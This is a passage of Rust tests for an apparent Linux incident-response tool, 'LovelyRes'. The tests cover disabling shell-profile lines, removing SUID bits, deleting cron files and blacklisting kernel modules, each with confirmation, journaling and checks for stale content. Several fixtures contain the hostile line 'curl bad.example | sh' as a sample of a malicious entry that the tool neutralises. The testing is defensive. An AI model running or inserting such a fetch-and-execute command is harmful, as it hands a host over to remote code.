                &cron.rows[1].id,
                ArtifactMutationAction::DeleteCronFile,
            )
            .is_err()
        );

        let shell = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::ShellConfigs, 8).unwrap(),
            "/etc/profile\troot\t1\t4\tcurl bad.example | sh\twarning\n/etc/profile\troot\t1\t5\t# already disabled\tnormal",
        );
        assert!(
            shell
                .artifact_mutation_request(
                    &shell.rows[0].id,
                    ArtifactMutationAction::CommentShellLine,
                )
                .is_ok()
        );
        assert!(
            shell
                .artifact_mutation_request(
                    &shell.rows[1].id,
                    ArtifactMutationAction::CommentShellLine,
                )
                .is_err()
        );

        let suid = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::SuidFiles, 8).unwrap(),
            "/usr/bin/passwd\t4755\troot\t1\tnow\thigh\n/tmp/forged\t4755\troot\t1\tnow\thigh\n/usr/bin/normal\t0755\troot\t1\tnow\tnormal",
        );
        for action in [
            ArtifactMutationAction::RemoveSuidBits,
            ArtifactMutationAction::QuarantineSuidFile,
        ] {
            assert!(
                suid.artifact_mutation_request(&suid.rows[0].id, action)
                    .is_ok()
            );
            assert!(
                suid.artifact_mutation_request(&suid.rows[1].id, action)
                    .is_err()
            );
            assert!(
                suid.artifact_mutation_request(&suid.rows[2].id, action)
                    .is_err()
            );
        }
        assert!(
            suid.artifact_mutation_request(
                &suid.rows[0].id,
                ArtifactMutationAction::DeleteCronFile,
            )
            .is_err()
        );

        let modules = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::KernelModules, 8).unwrap(),
            "nf_conntrack\t4096\t0\tnormal\n--help\t1\t0\thigh",
        );
        for action in [
            ArtifactMutationAction::AddManagedModuleBlacklist,
            ArtifactMutationAction::RemoveManagedModuleBlacklist,
        ] {
            let request = modules
                .artifact_mutation_request(&modules.rows[0].id, action)
                .unwrap();
            assert_eq!(
                request.path().as_str(),
                "/etc/modprobe.d/lovelyres-blacklist-nf_conntrack.conf"
            );
            assert!(
                modules
                    .artifact_mutation_request(&modules.rows[1].id, action)
                    .is_err()
            );
        }
    }

    #[test]
    fn shell_line_comment_preserves_bytes_and_rejects_stale_display_content() {
        let original = b"export SAFE=1\n\tcurl bad.example | sh\r\nlast=1\n";
        let replacement = comment_shell_line(original, 2, " curl bad.example | sh").unwrap();
        assert_eq!(
            replacement,
            b"export SAFE=1\n# LovelyRes disabled: \tcurl bad.example | sh\r\nlast=1\n"
        );
        assert!(comment_shell_line(original, 2, "changed").is_err());
        assert!(comment_shell_line(original, 9, "missing").is_err());
        assert!(comment_shell_line(b"# disabled\n", 1, "# disabled").is_err());
    }

    #[tokio::test]
    async fn cron_and_shell_mutations_use_exact_sftp_content_cas_and_journal() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        harness.set_sftp_immediate(true);
        harness.set_sftp_file(
            "/etc/cron.d/lovely-job",
            b"* * * * * root /bin/true\n".to_vec(),
        );
        let cron = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::Cron, 1).unwrap(),
            "root\t* * * * *\t/bin/true\t/etc/cron.d/lovely-job",
        );
        let request = cron
            .artifact_mutation_request(&cron.rows[0].id, ArtifactMutationAction::DeleteCronFile)
            .unwrap();
        let stale_plan = services
            .system_info()
            .plan_artifact_mutation(&session, &request)
            .await
            .unwrap();
        harness.set_sftp_file(
            "/etc/cron.d/lovely-job",
            b"* * * * * root /bin/changed\n".to_vec(),
        );
        let confirmation = DangerousConfirmation::approve(stale_plan.definition());
        assert!(
            services
                .system_info()
                .execute_artifact_mutation(
                    &session,
                    stale_plan,
                    confirmation,
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert!(services.operation_journal().entries().unwrap().is_empty());

        harness.set_sftp_file("/etc/profile", b"safe=1\ncurl bad.example | sh\n".to_vec());
        let shell = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::ShellConfigs, 1).unwrap(),
            "/etc/profile\troot\t1\t2\tcurl bad.example | sh\twarning",
        );
        let request = shell
            .artifact_mutation_request(&shell.rows[0].id, ArtifactMutationAction::CommentShellLine)
            .unwrap();
        let plan = services
            .system_info()
            .plan_artifact_mutation(&session, &request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_artifact_mutation(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verification.passed);
        let bound = services
            .sftp()
            .bind_session(session.target().clone(), session.session_id())
            .await
            .unwrap();
        assert_eq!(
            services
                .sftp()
                .read_file(&bound, &RemotePath::new("/etc/profile").unwrap())
                .await
                .unwrap(),
            b"safe=1\n# LovelyRes disabled: curl bad.example | sh\n"
        );
        assert_eq!(services.operation_journal().entries().unwrap().len(), 2);
    }

    #[tokio::test]
    async fn suid_permission_operation_is_snapshot_bound_journaled_and_verified() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        let sha = "ab".repeat(32);
        let snapshot = format!("{sha}\t4755\t0\t0\t4096\t8\t99");
        let applied = format!("{sha}\t755\t0\t0\t4096\t8\t99");
        let backup = format!("{sha}\t4755\t0\t0\t4096\t9\t100");
        harness.set_execute_outputs([
            snapshot.clone(),
            snapshot,
            "APPLIED".to_owned(),
            applied,
            backup,
        ]);
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::SuidFiles, 1).unwrap(),
            "/usr/bin/passwd\t4755\troot\t4096\tnow\thigh",
        );
        let request = table
            .artifact_mutation_request(&table.rows[0].id, ArtifactMutationAction::RemoveSuidBits)
            .unwrap();
        let plan = services
            .system_info()
            .plan_artifact_mutation(&session, &request)
            .await
            .unwrap();
        assert!(plan.definition().summary.contains("受管备份"));
        assert!(plan.definition().restore_description.is_some());
        let confirmation = DangerousConfirmation::approve(plan.definition());
        let outcome = services
            .system_info()
            .execute_artifact_mutation(&session, plan, confirmation, services.operation_journal())
            .await
            .unwrap();
        assert!(outcome.verification.passed);
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 2);
        assert!(
            entries
                .iter()
                .all(|entry| entry.source == "system-info-suid")
        );
    }

    #[tokio::test]
    async fn managed_module_blacklist_is_exclusive_exact_and_recoverable() {
        let root = TestRoot::new();
        let (services, session, harness) = bound_services(&root).await;
        harness.set_sftp_immediate(true);
        let table = parse_table(
            &SystemInfoRequest::new(SystemInfoTab::KernelModules, 1).unwrap(),
            "nf_conntrack\t4096\t0\tnormal",
        );
        let path =
            RemotePath::new("/etc/modprobe.d/lovelyres-blacklist-nf_conntrack.conf").unwrap();
        let add_request = table
            .artifact_mutation_request(
                &table.rows[0].id,
                ArtifactMutationAction::AddManagedModuleBlacklist,
            )
            .unwrap();
        let add_plan = services
            .system_info()
            .plan_artifact_mutation(&session, &add_request)
            .await
            .unwrap();
        assert_eq!(
            add_plan
                .definition()
                .metadata
                .get("mode")
                .map(String::as_str),
            Some("644")
        );
        let confirmation = DangerousConfirmation::approve(add_plan.definition());
        let added = services
            .system_info()
            .execute_artifact_mutation(
                &session,
                add_plan,
                confirmation,
                services.operation_journal(),
            )
            .await
            .unwrap();
        assert!(added.verification.passed);
        let bound = services
            .sftp()
            .bind_session(session.target().clone(), session.session_id())
            .await
            .unwrap();
        let expected = managed_module_policy_content("nf_conntrack").unwrap();
        assert_eq!(
            services.sftp().read_file(&bound, &path).await.unwrap(),
            expected
        );
        assert!(
            services
                .system_info()
                .plan_artifact_mutation(&session, &add_request)
                .await
                .is_err()
        );

        let remove_request = table
            .artifact_mutation_request(
                &table.rows[0].id,
                ArtifactMutationAction::RemoveManagedModuleBlacklist,
            )
            .unwrap();
        let stale_remove = services
            .system_info()
            .plan_artifact_mutation(&session, &remove_request)
            .await
            .unwrap();
        harness.set_sftp_file(path.as_str(), b"blacklist changed\n".to_vec());
        let confirmation = DangerousConfirmation::approve(stale_remove.definition());
        assert!(
            services
                .system_info()
                .execute_artifact_mutation(
                    &session,
                    stale_remove,
                    confirmation,
                    services.operation_journal(),
                )
                .await
                .is_err()
        );
        assert_eq!(services.operation_journal().entries().unwrap().len(), 2);

        harness.set_sftp_file(path.as_str(), expected);
        let remove_plan = services
            .system_info()
            .plan_artifact_mutation(&session, &remove_request)
            .await
            .unwrap();
        let confirmation = DangerousConfirmation::approve(remove_plan.definition());
        let removed = services
            .system_info()
            .execute_artifact_mutation(
                &session,
                remove_plan,
                confirmation,
                services.operation_journal(),
            )
            .await
            .unwrap();
        assert!(removed.verification.passed);
        assert!(!services.sftp().exists(&bound, &path).await.unwrap());
        assert_eq!(services.operation_journal().entries().unwrap().len(), 4);
    }
}
